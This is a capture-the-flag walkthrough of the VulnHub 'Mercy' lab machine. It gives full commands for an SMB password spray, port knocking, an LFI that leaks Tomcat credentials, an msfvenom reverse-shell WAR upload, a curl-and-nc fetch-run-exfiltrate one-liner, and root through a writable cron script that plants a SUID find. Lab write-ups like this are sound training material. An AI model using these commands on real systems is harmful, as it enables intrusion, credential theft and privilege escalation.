# Mercy - VulnHub Machine

Nmap Kernel guess: Linux 3.2 - 4.9 / Tomcat reveals 4.4.0-31-generic x86 arch
## Nmap
```
PORT     STATE    SERVICE     VERSION
22/tcp   filtered ssh
53/tcp   open     domain      ISC BIND 9.9.5-3ubuntu0.17 (Ubuntu Linux)
| dns-nsid:
|_  bind.version: 9.9.5-3ubuntu0.17-Ubuntu
80/tcp   filtered http
110/tcp  open     pop3        Dovecot pop3d
|_pop3-capabilities: UIDL PIPELINING SASL TOP AUTH-RESP-CODE STLS CAPA RESP-CODES
|_ssl-date: TLS randomness does not represent time
139/tcp  open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp  open     imap        Dovecot imapd (Ubuntu)
|_imap-capabilities: LOGINDISABLEDA0001 IDLE have ENABLE LITERAL+ SASL-IR post-login capabilities listed LOGIN-REFERRALS IMAP4rev1 ID Pre-login OK more STARTTLS
|_ssl-date: TLS randomness does not represent time
445/tcp  open     netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
99/tcp  open     ssl/imaps?
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2018-08-24T13:22:55
|_Not valid after:  2028-08-23T13:22:55
|_ssl-date: TLS randomness does not represent time
995/tcp  open     ssl/pop3s?
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2018-08-24T13:22:55
|_Not valid after:  2028-08-23T13:22:55
|_ssl-date: TLS randomness does not represent time
8080/tcp open     http        Apache Tomcat/Coyote JSP engine 1.1
| http-methods:
|_  Potentially risky methods: PUT DELETE
| http-robots.txt: 1 disallowed entry
|_/tryharder/tryharder
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat
MAC Address: 08:00:27:74:2A:CB (Oracle VirtualBox virtual NIC)
Service Info: Host: MERCY; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -7h40m01s, deviation: 4h37m07s, median: -5h00m02s
|_nbstat: NetBIOS name: MERCY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: mercy
|   NetBIOS computer name: MERCY\x00
|   Domain name: \x00
|   FQDN: mercy
|_  System time: 2020-12-02T06:24:10+08:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2020-12-01T22:24:10
|_  start_date: N/A
```

## Notes
- Tried SMB port no NULL sess allowed

Robots.txt gives us a path: /tryharder/tryharder which yields a base64 encoded string.

```
SXQncyBhbm5veWluZywgYnV0IHdlIHJlcGVhdCB0aGlzIG92ZXIgYW5kIG92ZXIgYWdhaW46IGN5YmVyIGh5Z2llbmUgaXMgZXh0cmVtZWx5IGltcG9ydGFudC4gUGxlYXNlIHN0b3Agc2V0dGluZyBzaWxseSBwYXNzd29yZHMgdGhhdCB3aWxsIGdldCBjcmFja2VkIHdpdGggYW55IGRlY2VudCBwYXNzd29yZCBsaXN0LgoKT25jZSwgd2UgZm91bmQgdGhlIHBhc3N3b3JkICJwYXNzd29yZCIsIHF1aXRlIGxpdGVyYWxseSBzdGlja2luZyBvbiBhIHBvc3QtaXQgaW4gZnJvbnQgb2YgYW4gZW1wbG95ZWUncyBkZXNrISBBcyBzaWxseSBhcyBpdCBtYXkgYmUsIHRoZSBlbXBsb3llZSBwbGVhZGVkIGZvciBtZXJjeSB3aGVuIHdlIHRocmVhdGVuZWQgdG8gZmlyZSBoZXIuCgpObyBmbHVmZnkgYnVubmllcyBmb3IgdGhvc2Ugd2hvIHNldCBpbnNlY3VyZSBwYXNzd29yZHMgYW5kIGVuZGFuZ2VyIHRoZSBlbnRlcnByaXNlLg==
```
```
It's annoying, but we repeat this over and over again: cyber hygiene is extremely important. Please stop setting silly passwords that will get cracked with any decent password list.

Once, we found the password "password", quite literally sticking on a post-it in front of an employee's desk! As silly as it may be, the employee pleaded for mercy when we threatened to fire her.

No fluffy bunnies for those who set insecure passwords and endanger the enterprise.
```

enum4linux gives us a couple local users:
```
pleadformercy
qiu
thisisasuperduperlonguser
fluffy
```

rpcclient enum
```
rpcclient $> getusrdompwinfo 0x3e8
    &info: struct samr_PwInfo
        min_password_length      : 0x0005 (5)
        password_properties      : 0x00000000 (0)
               0: DOMAIN_PASSWORD_COMPLEX  
               0: DOMAIN_PASSWORD_NO_ANON_CHANGE
               0: DOMAIN_PASSWORD_NO_CLEAR_CHANGE
               0: DOMAIN_PASSWORD_LOCKOUT_ADMINS
               0: DOMAIN_PASSWORD_STORE_CLEARTEXT
               0: DOMAIN_REFUSE_PASSWORD_CHANGE
```

## SMB Password Spray

Used Hydra to enumerate SMB users:
>$ hydra -l qiu -P /usr/share/wordlists/rockyou.txt 10.1.62.49 smb -V -f

Gives us the login:
>[445][smb] host: 10.1.62.49   login: qiu   password: password

SMB login:
>$ smbclient -U qiu%password \\\\10.1.62.49\\qiu

.bash_history
```
exit
cd ../
cd home
cd qiu
cd .secrets
ls -al
cd .private
ls
cd secrets
ls
ls -al
cd ../
ls -al
cd opensesame
ls -al
./configprint
sudo configprint
sudo su -
exit
```

## Port Knocker Sequences

Inside the SMB share there is a hidden folder called *.private/opensesame*, which contains a script and a config file. The script exports settings to the config file, in these its the port knocking daemon.  This setting in particular explains why port 22 was filtered in the initial scan. 

```
[openHTTP]                                                                                                                                       
        sequence    = 159,27391,4                                                                                                                
        seq_timeout = 100                                                                                                                        
        command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 80 -j ACCEPT                                                                
        tcpflags    = syn 
...
...
[openSSH]
        sequence    = 17301,28504,9999
        seq_timeout = 100
        command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
        tcpflags    = syn
```

In order for the OpenSSH and HTTP services to open we need to send a TCP request to the ports in order.

**With *knockd* installed.**

SSH:

>$ knock 10.1.62.49 17301:tcp 28504:tcp 9999:tcp

>$ knock 10.1.62.49 159:tcp 27391:tcp 4:tcp

**or with *ncat*.**

>$ nc -znv 10.1.62.49 17301 28504 9999

>$ nc -znv 10.1.62.49 159 27391 4

Now we are able to see the OpenSSH and Apache ports:

```
λ nmap -sV -p 22,80 10.1.62.49
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-02 21:58 EST
Nmap scan report for 10.1.62.49
Host is up (0.00044s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## HTTP Port 80

*robots.txt*
```
User-agent: *
Disallow: /mercy
Disallow: /nomercy
```

/
```
/index.html (Status: 200)
/login.html (Status: 200)
/time (Status: 200)
/robots.txt (Status: 200)
/server-status (Status: 403)
```

/mercy

## RIPS

/nomercy subfolder contains version 0.52 of *RIPS*

This version is vulnerable to a LFI vulnerability through the *file* parameter in the *code.php* file.

![lfi](img/lfi_rips.png)

The main page for the Tomcat installation reveals a path to a configuration file for user.
The following URL allows us to read this file:
>http://10.1.62.49/nomercy/windows/code.php?file=../../../../../../../../etc/tomcat7/tomcat-users.xml

At the end of the documents we see the user section:
```
<? <role rolename="admin-gui"/>
<? <role rolename="manager-gui"/>
<? <user username="thisisasuperduperlonguser" password="heartbreakisinevitable" roles="admin-gui,manager-gui"/>
<? <user username="fluffy" password="freakishfluffybunny" roles="none"/> 
```

Once we login to the Tomcat site we see we are able to upload WAR files to the server:

![war](img/war_up.png)

Generate payload with *msfvenom*:

>$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.1.62.42 LPORT=4242 -e x86/shikata_ga_nai -f war > pay.war

Now we need to check the name of our backdoor, for this we unzip the .war file:

```
disastrpc mercy λ unzip pay.war 
Archive:  pay.war
   creating: META-INF/
  inflating: META-INF/MANIFEST.MF    
   creating: WEB-INF/
  inflating: WEB-INF/web.xml         
  inflating: ngrqahikjybb.jsp
```

The name of our payload is *ngrqahikjybb.jsp*.

We upload our generated .war file and navigate to the path */pay/ngrqahikjybb.jsp* and catch the shell with nc.

```
disastrpc mercy λ nc -nlvp 4242
listening on [any] 4242 ...
connect to [10.1.62.42] from (UNKNOWN) [10.1.62.49] 43682
whoami
tomcat7
```

## Local Enum

```
tomcat7@MERCY:/home/thisisasuperduperlonguser/work$ ls
configuration.txt  password.txt  systeminfo.txt
tomcat7@MERCY:/home/thisisasuperduperlonguser/work$ cat configuration.txt 
This is not it!
tomcat7@MERCY:/home/thisisasuperduperlonguser/work$ cat password.txt 
Try harder!
tomcat7@MERCY:/home/thisisasuperduperlonguser/work$ cat systeminfo.txt 
This is not the superdupershortway to root!
```

Host linpeas.sh on a webserver and download, execute and exfiltrate using nc. 

>tomcat7@MERCY:/tmp$ curl 10.1.62.42/linpeas.sh > lp.sh && bash lp.sh > lp.enum && nc -nv 10.1.62.42 5000 < lp.enum && rm lp.*

Inside fluffy home:

```
fluffy@MERCY:~/.private/secrets$ ls -la
total 20
drwxr-xr-x 2 fluffy fluffy 4096 Nov 20  2018 .
drwxr-xr-x 3 fluffy fluffy 4096 Nov 20  2018 ..
-rwxr-xr-x 1 fluffy fluffy   37 Nov 20  2018 backup.save
-rw-r--r-- 1 fluffy fluffy   12 Nov 20  2018 .secrets
-rwxrwxrwx 1 root   root    222 Nov 20  2018 timeclock
```

Timeclock script might let us execute code as root. 
```
fluffy@MERCY:~/.private/secrets$ cat timeclock 
#!/bin/bash

now=$(date)
echo "The system time is: $now." > ../../../../../var/www/html/time
echo "Time check courtesy of LINUX" >> ../../../../../var/www/html/time
chown www-data:www-data ../../../../../var/www/html/time
```

We are allowed to modify the script, so we make a copy and add a malicious line to the bottom.

>$ echo "sh -c 'cp $(which find) /tmp/find; chmod +s /tmp/find" >> timeclock

This creates a copy of the *find* binary with the SUID bit set.

We can then use that binary to elevate our privileges:

```
fluffy@MERCY:/tmp$ ./find . -exec /bin/sh \; -quit   
# whoami
root
# 
```

## Notes
- Tomcat Path /usr/share/tomcat7
- /etc/dovecot/dovecot.conf <- nothing interesting

**We can su into** *fluffy:freakishfluffybunny*
**We can su into** *qiu:password*

Todo
Try su into users
Linux 4.4.0-31 try kernel exploit
PATH inclused . for current directory but its at the end.

Host has virtual network adapter virbr0

Interesting pspy32 output. Proc running as UID 0
```
2020/12/04 01:45:01 CMD: UID=0    PID=21047  | bash /home/qiu/.private/opensesame/configprint 
2020/12/04 01:45:01 CMD: UID=0    PID=21046  | bash /home/qiu/.private/opensesame/configprint 
2020/12/04 01:45:01 CMD: UID=0    PID=21045  | /bin/sh -c bash /home/qiu/.private/opensesame/configprint 
```

